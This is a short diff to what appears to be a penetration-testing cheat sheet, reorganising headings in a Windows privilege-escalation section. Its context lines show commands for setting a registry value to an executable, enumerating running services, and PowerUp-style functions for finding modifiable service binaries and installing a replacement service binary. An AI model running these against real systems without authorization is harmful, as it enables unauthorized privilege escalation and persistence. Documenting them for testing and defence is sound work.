@@ -4449,7 +4449,9 @@ req query <REGISTRY_KEY>
 reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
 ```
 
-##### Running Services Enumeration
+##### Leveraging Windows Services
+
+###### Running Services Enumeration
 
 ```c
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
@@ -4524,7 +4526,7 @@ Get-ModifiableServiceFile
 Install-ServiceBinary -Name '<SERVICE>'
 ```
 
-##### Service Execution Properties Enumeration
+###### Service Execution Properties Enumeration
 
 ```c
 $ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
